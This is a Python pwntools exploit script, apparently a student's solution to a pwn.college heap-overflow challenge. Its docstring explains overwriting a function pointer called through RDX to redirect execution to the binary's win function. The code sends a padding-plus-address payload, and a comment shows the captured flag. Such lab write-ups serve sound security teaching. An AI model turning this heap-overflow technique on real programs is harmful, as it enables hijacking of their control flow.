#!/usr/bin/env python3
import sys
from time import sleep
from multiprocessing import Process
import pwn

'''
==========================================
Final Project - Challenge 1 Solution
Submission by Sparsh Mehta / hutgrabber
UID 119362914
==========================================
## Understanding the Binary:
    The binary that is provisioned along with this assignment is a basic one that does a few memory
    operations on the stack/heap from what can be seen by running it. On opening the binary in Ghidra
    we can see that different functions are called. However, looking at the code, it can be seen that
    the use of `memset()`, `free()`, etc. tells us that heap memory is being manipulated.

    After understanding this, we can decompile the same `main()` function in GDB/PwnDbg to find that
    there is a call RDX function in the end of the main method. This will allow us to perform a basic
    heap overflow that can overwrite RDX. Which is essentially a function pointer that can allow us
    to get control of RIP. We will point RIP to the `win` function in the binary that gets the flag.

## Exploitation
    We are using the `sendline()` and `recvline()` methods of pwntools to handle the IO for this binary.
    Using pwntools we will first send option 1, 10, 10, 2, 4, 5. Which will allow us to create new
    memory. The program asks for the size of the memory and then the data to add. For the size we can 
    set 10 bytes and for the data we will initially use the letters `A->Z` to see where the overflow
    is happening and how the heap is behaving. We can use the `bins` and `heap` command to see the heap
    in GDB/PwnDbg after the input has been taken.

    Once the data is sent, we will use option 2, to free the memory. Which will put everything in the bins.
    Next, we can use the options 4 & 5 to prepare the jump where RDX is called, and then perfrom the JUMP to
    wherever the RIP is pointing. What we want to do here, is use `pwn.symbols()` function to inject the
    address of `win` at the top of our `data` payload. With trial-and-error we find that the buffer fills
    up after the letter "P". Thus, our payload can look something like this:
        `b"ABCDEFGHIJKLMNOP"+\xde\xad\xbe\xef)`
    where the latter can be the address of win. This will essentially put the address of win in the function
    pointer, and in-turn put it into RIP which will change the flow of the program to the execution
    of the win method. This will open the flag and print the contents into the terminal. Which can be seen
    as a comment towards the end of this code.
'''
pwn.context.terminal = ["tmux","splitw","-h"]

def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath] + argv, *a, **kw)

binPath = "/challenge/challenge3"

gdbscript = '''
break *main+275
continue
'''.format(**locals())

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = "critical"

io = start()

io.recvuntil(b": ") # main menu, sent option 1
io.sendline(b"1")

io.recvuntil(b": ") # size, sent 10
io.sendline(b"10")

io.recvuntil(b": ") # data, sent Letters.

# To check the heap size and size of overflow:
# io.sendline(b"ABCDEFGHIJKLMNOPQRSTUVWXYZ)

io.sendline(b"ABCDEFGHIJKLMNOP"+pwn.p64(elf.symbols["win"]))

io.recvuntil(b": ") # main menu, sent option 2
io.sendline(b"2")

io.recvuntil(b": ") # main menu, sent option 4
io.sendline(b"4")

io.recvuntil(b": ") # main menu, sent option 5
io.sendline(b"5")

io.recvline()
io.sendline(b"3")

'''
hacker@final~challenge-3:~$ ./challenge_3.py 
pwn.college{o8krGzKjwUyKwsWx9TmtojLiBHj.dFTM4QDLzEzN1QzW}

+---------------------+
|         Menu        |
+---------------------+
| 1. allocate memory  |
| 2. freeing memory   |
| 3. exit             |
| 4. Prepare Jump!    |
| 5. Jump!            |
+---------------------+
| select [1-5] : $  
'''
